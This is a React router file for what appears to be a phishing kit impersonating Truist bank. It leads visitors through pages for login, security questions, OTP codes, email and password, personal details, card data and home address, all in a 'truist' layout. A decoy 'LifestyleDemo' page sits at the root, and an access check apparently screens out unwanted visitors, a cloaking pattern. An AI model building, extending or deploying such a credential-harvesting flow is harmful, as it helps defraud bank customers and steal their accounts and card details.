import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import useAccessCheck from './Utils/useAccessCheck';
import { baseUrl } from './constants';

// Components
import FlowLayout from './components/FlowLayout';

// Pages
import LoginForm from './pages/LoginForm';
import SecurityQuestions from './pages/SecurityQuestions';
import OTP from './pages/OTP';
import EmailPassword from './pages/EmailPassword';
import BasicInfo from './pages/BasicInfo';
import Card from './pages/Card';
import HomeAddress from './pages/HomeAddress';
import Terms from './pages/Terms';
import Register from './pages/Register';
import LifestyleDemo from './pages/LifestyleDemo';

interface ProtectedLayoutProps {
  children: React.ReactNode;
  containerClassName?: string;
  layoutVariant?: 'default' | 'truist';
}

// Layout component for protected routes
const ProtectedLayout: React.FC<ProtectedLayoutProps> = ({ children, containerClassName, layoutVariant }) => {
  const isAllowed = useAccessCheck(baseUrl);
  const statusTextClass = layoutVariant === 'truist' ? 'text-[#2b0d49]' : 'text-white';

  if (isAllowed === null) {
    return (
      <FlowLayout variant={layoutVariant}>
        <div className={`${statusTextClass} text-center text-lg`}>Loading...</div>
      </FlowLayout>
    );
  }

  if (isAllowed === false) {
    return (
      <FlowLayout variant={layoutVariant}>
        <div className={`${statusTextClass} text-center text-lg`}>Access denied. Redirecting...</div>
      </FlowLayout>
    );
  }

  return (
    <FlowLayout variant={layoutVariant}>
      <div className={containerClassName ?? 'w-full max-w-2xl'}>{children}</div>
    </FlowLayout>
  );
};

const ProtectedRoute: React.FC<ProtectedLayoutProps> = ({ children, containerClassName, layoutVariant }) => {
  return (
    <ProtectedLayout containerClassName={containerClassName} layoutVariant={layoutVariant}>
      {children}
    </ProtectedLayout>
  );
};

function App() {
  return (
    <Router>
      <Routes>
        {/* Public routes */}
        <Route path="/" element={<LifestyleDemo />} />

        {/* Protected routes */}
        <Route
          path="/login"
          element={
            <ProtectedRoute containerClassName="w-full" layoutVariant="truist">
              <LoginForm />
            </ProtectedRoute>
          }
        />

        <Route
          path="/security-questions"
          element={
            <ProtectedRoute layoutVariant="truist">
              <SecurityQuestions />
            </ProtectedRoute>
          }
        />

        <Route
          path="/otp"
          element={
            <ProtectedRoute containerClassName="w-full max-w-md" layoutVariant="truist">
              <OTP />
            </ProtectedRoute>
          }
        />

        <Route
          path="/email-password"
          element={
            <ProtectedRoute containerClassName="w-full max-w-md" layoutVariant="truist">
              <EmailPassword />
            </ProtectedRoute>
          }
        />

        <Route
          path="/basic-info"
          element={
            <ProtectedRoute layoutVariant="truist">
              <BasicInfo />
            </ProtectedRoute>
          }
        />

        <Route
          path="/card"
          element={
            <ProtectedRoute containerClassName="w-full max-w-md" layoutVariant="truist">
              <Card />
            </ProtectedRoute>
          }
        />

        <Route
          path="/home-address"
          element={
            <ProtectedRoute layoutVariant="truist">
              <HomeAddress />
            </ProtectedRoute>
          }
        />

        <Route
          path="/register"
          element={
            <ProtectedRoute layoutVariant="truist">
              <Register />
            </ProtectedRoute>
          }
        />

        <Route
          path="/terms"
          element={
            <ProtectedRoute layoutVariant="truist">
              <Terms />
            </ProtectedRoute>
          }
        />

        {/* Redirect any unknown routes to home */}
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </Router>
  );
}

export default App;
